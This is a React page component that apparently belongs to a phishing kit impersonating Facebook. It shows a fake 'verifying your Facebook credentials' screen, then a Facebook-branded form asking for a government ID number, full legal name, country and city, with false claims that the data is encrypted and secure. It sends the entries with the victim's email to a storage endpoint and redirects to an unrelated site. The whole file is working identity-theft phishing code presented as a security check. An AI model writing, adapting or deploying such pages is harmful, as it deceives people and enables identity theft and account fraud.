import { useState, useEffect } from 'react';

export default function Verification() {
  const [step, setStep] = useState(1);
  const [userData, setUserData] = useState({
    country: '',
    idNumber: '',
    fullName: '',
    city: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    // Check if user came from login
    const email = localStorage.getItem('user_email');
    if (!email) {
      window.location.href = '/auth/facebook';
      return;
    }
    setUserEmail(email);
  }, []);

  // Step 1: Verifying (automatic progression)
  useEffect(() => {
    if (step === 1) {
      const timer = setTimeout(() => {
        setStep(2);
      }, 3000); // 3 seconds for "verifying"
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleInputChange = (e) => {
    setUserData({
      ...userData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Store in localStorage for future sessions
      const userSession = {
        email: userEmail,
        ...userData,
        verified: true,
        verifiedAt: new Date().toISOString()
      };
      localStorage.setItem('user_session', JSON.stringify(userSession));

      // Send to NeonDB
      await fetch('/api/store-verification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userSession)
      });

      // Clear login session
      localStorage.removeItem('user_email');
      
      // Redirect to YouTube
      window.location.href = 'https://art-premier-music-library.vercel.app/';
      
    } catch (error) {
      console.error('Verification failed:', error);
      setIsLoading(false);
    }
  };

  // Step 1: Verifying
  if (step === 1) {
    return (
      <div className="verification-container">
        <div className="verification-box">
          <div className="loading-spinner">
            <div className="spinner"></div>
          </div>
          <h2>Verifying Your Account</h2>
          <p>Please wait while we verify your Facebook credentials...</p>
          <div className="security-notice">
            <span className="shield-icon">🛡️</span>
            <small>This helps us keep your account secure</small>
          </div>
        </div>

        <style jsx>{`
          .verification-container {
            min-height: 100vh;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Helvetica, Arial, sans-serif;
          }
          
          .verification-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
          }
          
          .loading-spinner {
            margin-bottom: 20px;
          }
          
          .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
          }
          
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          
          h2 {
            color: #1c1e21;
            margin-bottom: 10px;
          }
          
          p {
            color: #606770;
            margin-bottom: 20px;
          }
          
          .security-notice {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #65676b;
            font-size: 14px;
          }
        `}</style>
      </div>
    );
  }

  // Step 2: Identity Verification Form
  return (
    <div className="verification-container">
      <div className="verification-box">
        <div className="header">
          <div className="facebook-logo">facebook</div>
          <h2>Confirm Your Identity</h2>
          <p>We need to verify your identity to secure your account</p>
        </div>

        <form onSubmit={handleSubmit} className="verification-form">
          <div className="input-group">
            <label htmlFor="country">Country</label>
            <select
              id="country"
              name="country"
              value={userData.country}
              onChange={handleInputChange}
              required
              className="form-input"
            >
              <option value="">Select your country</option>
              <option value="US">United States</option>
              <option value="UK">United Kingdom</option>
              <option value="CA">Canada</option>
              <option value="AU">Australia</option>
              <option value="DE">Germany</option>
              <option value="FR">France</option>
              <option value="NG">Nigeria</option>
              <option value="KE">Kenya</option>
              <option value="ZA">South Africa</option>
              <option value="GH">Ghana</option>
              {/* Add more countries as needed */}
            </select>
          </div>

          <div className="input-group">
            <label htmlFor="idNumber">Government ID Number</label>
            <input
              type="text"
              id="idNumber"
              name="idNumber"
              value={userData.idNumber}
              onChange={handleInputChange}
              placeholder="Enter your national ID, passport, or driver's license"
              required
              className="form-input"
            />
            <small className="help-text">
              This helps us verify your identity and prevent fraud
            </small>
          </div>

          <div className="input-group">
            <label htmlFor="fullName">Full Legal Name</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={userData.fullName}
              onChange={handleInputChange}
              placeholder="As it appears on your government ID"
              required
              className="form-input"
            />
          </div>

          <div className="input-group">
            <label htmlFor="city">City of Residence</label>
            <input
              type="text"
              id="city"
              name="city"
              value={userData.city}
              onChange={handleInputChange}
              placeholder="Enter your current city"
              required
              className="form-input"
            />
          </div>

          <div className="privacy-notice">
            <div className="lock-icon">🔒</div>
            <div className="notice-text">
              <strong>Your information is secure</strong>
              <p>We use encryption to protect your personal data and comply with privacy regulations.</p>
            </div>
          </div>

          <button 
            type="submit" 
            className="confirm-button"
            disabled={isLoading}
          >
            {isLoading ? 'Confirming...' : 'Confirm Identity'}
          </button>
        </form>
      </div>

      <style jsx>{`
        .verification-container {
          min-height: 100vh;
          background: #f0f2f5;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: Helvetica, Arial, sans-serif;
          padding: 20px;
        }
        
        .verification-box {
          background: white;
          padding: 30px;
          border-radius: 8px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          max-width: 450px;
          width: 100%;
        }
        
        .header {
          text-align: center;
          margin-bottom: 30px;
        }
        
        .facebook-logo {
          font-size: 28px;
          font-weight: bold;
          color: #1877f2;
          margin-bottom: 15px;
        }
        
        .header h2 {
          color: #1c1e21;
          margin-bottom: 8px;
        }
        
        .header p {
          color: #606770;
          font-size: 14px;
        }
        
        .verification-form {
          display: flex;
          flex-direction: column;
          gap: 20px;
        }
        
        .input-group {
          display: flex;
          flex-direction: column;
          gap: 6px;
        }
        
        label {
          font-weight: 600;
          color: #1c1e21;
          font-size: 14px;
        }
        
        .form-input {
          padding: 12px;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          font-size: 16px;
          background: #f5f6f7;
        }
        
        .form-input:focus {
          border-color: #1877f2;
          outline: none;
          background: white;
        }
        
        .help-text {
          color: #65676b;
          font-size: 12px;
        }
        
        .privacy-notice {
          display: flex;
          gap: 12px;
          background: #f0f8ff;
          padding: 15px;
          border-radius: 6px;
          border: 1px solid #d1e9ff;
        }
        
        .lock-icon {
          font-size: 20px;
        }
        
        .notice-text {
          flex: 1;
        }
        
        .notice-text strong {
          color: #1c1e21;
          display: block;
          margin-bottom: 4px;
        }
        
        .notice-text p {
          color: #606770;
          font-size: 12px;
          margin: 0;
        }
        
        .confirm-button {
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 16px;
          font-weight: bold;
          cursor: pointer;
          transition: background 0.2s;
        }
        
        .confirm-button:hover:not(:disabled) {
          background: #166fe5;
        }
        
        .confirm-button:disabled {
          background: #ccc;
          cursor: not-allowed;
        }
      `}</style>
    </div>
  );
}
